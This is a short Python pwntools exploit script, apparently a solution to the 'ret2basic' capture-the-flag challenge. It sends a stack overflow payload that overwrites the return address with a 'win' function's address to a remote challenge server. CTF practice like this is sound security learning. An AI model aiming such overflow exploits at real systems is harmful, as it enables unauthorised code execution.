#!/usr/bin/env python3

from pwn import *

elf = ELF("./ret2basic")
#program = elf.process()
program = remote("challenge.nahamcon.com", 30384)

payload = b"A"*120 + p32(elf.symbols['win'])

program.recvuntil(': ')
program.sendline(payload)
program.recvline()
print(program.recvline())